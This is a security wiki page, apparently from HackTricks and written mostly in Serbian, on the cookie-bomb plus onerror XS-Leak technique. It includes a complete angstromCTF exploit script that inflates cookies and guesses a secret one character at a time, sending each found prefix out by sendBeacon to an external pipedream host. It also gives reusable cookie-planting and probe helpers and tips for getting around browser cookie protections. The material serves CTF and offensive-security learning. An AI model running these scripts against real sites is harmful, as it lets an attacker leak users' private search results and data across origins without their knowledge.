# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Ova tehnika kombinuje:
- Cookie bombing: punjenje browsera žrtve sa mnogo/velikih cookies za ciljni origin tako da naredni zahtevi pređu server/request limite (veličina request header-a, veličina URL-a u redirect-ovima, itd.).
- Error-event oracle: ispitivanje cross-origin endpointa putem `<script>` (ili drugog subresursa) i razlikovanje stanja koristeći `onload` naspram `onerror`.

High level idea
- Pronađite ciljni endpoint čije se ponašanje razlikuje za dva stanja koja želite testirati (npr. search “hit” vs “miss”).
- Osigurajte da će “hit” putanja izazvati težak lanac preusmeravanja ili dugačak URL dok “miss” putanja ostaje kratka. Napuhajte request headers koristeći mnogo cookies tako da samo “hit” putanja natera server da zakaže sa HTTP greškom (npr. 431/414/400). Greška okida onerror događaj i postaje orakl za XS-Search.

Kada ovo funkcioniše
- Možete naterati browser žrtve da pošalje cookies ciljnom originu (npr. cookies su SameSite=None ili ih možete postaviti u first-party kontekstu preko popup `window.open`).
- Postoji feature u aplikaciji koju možete zloupotrebiti da postavite proizvoljne cookies (npr. “save preference” endpointi koji pretvaraju kontrolisana imena/vrednosti inputa u `Set-Cookie`) ili da napravite post-auth redirect-e koji ugrađuju podatke pod kontrolom napadača u URL.
- Server se drugačije ponaša u ta dva stanja i, sa napućenim headers/URL-om, jedno stanje pređe limit i vrati odgovor sa greškom koji okida onerror.

Napomena o server greškama korišćenim kao orakl
- 431 Request Header Fields Too Large se često vraća kada cookies napuhaju request headers; 414 URI Too Long ili neki server-specifičan 400 može biti vraćen za dugačke request target-e. Bilo koja od ovih rezultira neuspelim učitavanjem subresource-a i pokreće onerror. See [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) for typical causes like excessive cookies.

<details>
<summary>Practical example (angstromCTF 2022)</summary>

Sledeći script (iz javnog writeupa) zloupotrebljava feature koji omogućava napadaču da ubaci proizvoljne cookies, zatim učitava cross-origin search endpoint kao script. Kada je query tačan, server izvrši redirect koji, zajedno sa cookie bloat-om, premaši server limite i vrati status greške, pa `script.onerror` bude pokrenut; u suprotnom se ništa ne dešava.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

Zašto popup (`window.open`)?
- Moderne pregledače sve češće blokiraju third-party cookies. Otvaranje top-level prozora prema targetu čini kolačiće first‑party pa će odgovori Set-Cookie sa targeta ostati, omogućavajući cookie-bomb korak čak i uz ograničenja third‑party cookies.

2024–2025 напомене о доступности колачића
- Chrome’s Tracking Protection rollout (January 2024) већ блокира third-party cookies за насумичну kohortu и планира се да се прошири на целу базу корисника када UK CMA потврди, па претпоставите да било који жртва може изненада изгубити 3P cookies. Аутоматизујте fallback: детектујте када probe вашег скрипта не успе без икаквог погађања target-а и транспарентно пређите на popup/first-party ток. Safari и Firefox већ по default-у блокирају већину third-party cookies, а CHIPS/partitioned cookies значи да сваки top-level сајт сада има свој сопствени jar.
- Koristite first‑party cookie planting flow (`window.open` + auto-submit to a cookie-setting endpoint) и затим probe-ујте помоћу subresource-а који успева само када се ти kolačići пошаљу. Ако су third‑party cookies блокирани, преместите probe у same-site контекст (нпр. покрените oracle у popup-у преко same-site gadget-а и exfiltrate-ујте boolean користећи `postMessage` или a beacon ка вашем серверу), или упишите origin жртве у Chrome’s deprecation trial ако га легитимно контролишете.

<details>
<summary>Tracking-Protection-safe first-party planting helper</summary>

Када треба да убаците десетине kolačiћа из cross-site контекста, поставите привремени top-level prozor и покрените серију oversize form submissions ка рањивом Set-Cookie endpoint-у:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
Pozovi ga neposredno pre nego što počneš probing tako da svaki oracle run počinje sa sveže napumpanim cookie jar.

</details>

Generički probing pomoćnik
Ako već imaš način da postaviš mnogo cookies na target origin (first-party), možeš ponovo iskoristiti ovaj minimalni oracle protiv bilo kog endpoint čiji success/failure dovodi do različitih network outcomes (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternativni tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Napredno: de Bruijn–based cookie packing (CTF-proven)
- Kada aplikacija dozvoli da kontrolišeš velike cookie values, možeš efikasno pakovati pogađanja tako što ćeš svakom probe придодати de Bruijn sekvencu. Ovo održava mali per‑probe overhead dok obezbeđuje da je heavy branch konzistentno teži samo za pravi prefix. Primer generatora za |Σ| simbola dužine n (fits in a cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in practice: set multiple cookies whose values are prefix + deBruijn(k,n). Only when the tested prefix is correct does the server take the heavy path (e.g., extra redirect reflecting the long cookie or URL), which, combined with the cookie bloat, crosses limits and flips onerror. See a LA CTF 2024 public solver using this approach.

Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using `window.open` loops.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) tightened script tag load/error accounting for cross-origin resources (CVE-2025-5266). On patched clients the `onerror` signal for certain redirected responses is suppressed, so diversify the oracle (parallel `<link rel=stylesheet>`, `<img>`, or `fetch` with mismatched MIME) and fingerprint the victim UA before assuming the boolean still fires.
- Expect enterprise Chromium builds with Tracking Protection or Fetch Metadata policies to intermittently strip cookies or rewrite redirects. Detect these cases by probing a short endpoint first; when it fails, automatically pivot to running the entire attack inside the popup and relaying bits through `postMessage`/`BroadcastChannel`.

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
